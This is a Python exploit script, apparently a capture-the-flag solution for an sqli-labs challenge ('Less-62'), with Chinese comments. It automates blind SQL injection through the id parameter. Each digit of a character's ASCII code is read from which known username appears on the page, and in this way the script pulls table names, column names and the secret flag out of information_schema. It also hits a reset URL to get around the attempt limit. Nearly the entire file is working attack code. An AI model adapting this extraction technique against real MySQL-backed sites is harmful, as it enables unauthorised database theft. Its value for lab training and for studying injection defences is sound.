# author:unc1e
import requests
import string

# mysql> select ascii('1'), (select substring(ascii('1'),1,1)), (select substring(ascii('1'),2,1));
# +------------+------------------------------------+------------------------------------+
# | ascii('1') | (select substring(ascii('1'),1,1)) | (select substring(ascii('1'),2,1)) |
# +------------+------------------------------------+------------------------------------+
# |         49 | 4                                  | 9                                  |
# +------------+------------------------------------+------------------------------------+

def str_to_hex(s):
    '''
    :param s:
    :return: 将字符串转为0x带头的十六进制值
    '''
    return '0x'+''.join([hex(ord(c)).replace('0x', '') for c in s])

# initialize param
url = "https://sec4ever.cn/Less-62/index.php?id=0') "
reset_url ="https://sec4ever.cn/sql-connections/setup-db-challenge.php?id={}".format(url.split("sec4ever.cn")[1])   # /sql-connections/setup-db-challenge.php?id=/Less-60/index.php


TIMEOUT = 8
VERIFY = True

table_name_len = len('UX9CUK2CIC')
flag_len = len('uwpeCvsrLcadsa8P7wSn9Ix4')

charIndexSet =  ["Dumb","Angelina","Dummy","secure","stupid","superman","batman","admin","admin1","admin2","admin3","dhakkan","admin4"]   # 字符串特征,index is from 0-9
charIndexSet_rev = charIndexSet[::-1] 
Set =  [ -3, -2, -1 ]   # 取字符串ascii值的百位+十位+个位
# 个位：substring((query),-1, 1)
# 十位：substring((query),-2, 1)；
# 百位  substring((query),-3, 1),

# 初始化
sess = requests.session()

def req2getOneChar(xurl, payload, start, end):
    '''

    :param xurl: base url
    :param payload: (select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)
    :param start ,end: [start, end]
    :return:
    '''

    asciiValue = ['0','0','0'] # 百位，十位，个位 
    flag = ""
    for l in range(start, end+1):
        for k, kv in enumerate(Set):# 先获取
            # k = 0，1，2
            # kv = -3，-2，-1 用于substring得到ascii值的各个位上的数字
            url = xurl + "or id=" + "substring(ascii(substring(({payload}), {l}, 1)), {kv}, 1)".format(payload=payload, l=l, kv=kv ) + '-- -'
            #print(url)
            resp = sess.get(url=url, timeout=TIMEOUT, verify=VERIFY)
            for i in range(1, 10):# 遍历1~9的特征值for(1,10)
                s1 = 'Your Login name : ' + charIndexSet[i]# "Dumb"
                e1 = 'Your Password : ' + charIndexSet_rev[i]#admin4
                if( resp.text.count(s1) > 0  and resp.text.count(e1) > 0):
                    # 若页面内容中含有当前特征值，则认为当前特征值的索引是其对应位的值（0～9）
                    # 如：页面同时含有Angelina和dhakkan，该位值为1
                    asciiValue[k] = str(i) # 0是个位，1是百位和十位
                    break
                else:
                    asciiValue[k] = '0'
                    continue

        foo = int(asciiValue[0] + asciiValue[1] + asciiValue[2])# 如'4'+'9' => 49, '10'+'2'=102
        flag += chr(foo)    #chr(49)='1'
        print("[-]current content is:{}".format(flag))
    if flag != '':
        return flag
    else:
        print("[!]req2getOneChar ERROR!")


# step 1：获取表名
def getTables():
    # P79FGLN0JK
    payload = '''(select group_concat(table_name) from information_schema.tables where table_schema=0x6368616c6c656e676573)'''
    table_name = req2getOneChar(xurl=url, payload=payload, start=1, end=table_name_len)
    print("[-]table_name is:{}".format(table_name))
    return table_name



def getColumn():
    '''
    获取列名，
    --------------------------
内容 id,sessid,secret_Y1P6,tryy
              ↑         ↑
位置          11        21
    --------------------------
    '''
    # step 2：获取列名
    payload = '''(select group_concat(column_name) from information_schema.columns where table_schema=0x6368616c6c656e676573 and table_name={table})'''.format(table=str_to_hex(table_name))
    column_name = req2getOneChar(xurl=url, payload=payload, start=11, end=21)

    if "secret" in column_name:
        print("[+]column_name is:{}".format(column_name))
        return column_name
    else:
        print("step2 失败！")



'''
uwpeCvsrLcadsa8P7wSn9Ix4
'''
# 清空次数
sess.get(url=reset_url, verify=VERIFY)

# exploit
table_name = getTables()
column_name = getColumn()


# step 3 获取flag
payload = '''(select {} from {})'''.format((column_name), (table_name))
flag = req2getOneChar(xurl=url, payload=payload, start=1, end=flag_len)
print("[+]FLAG is:{}".format(flag))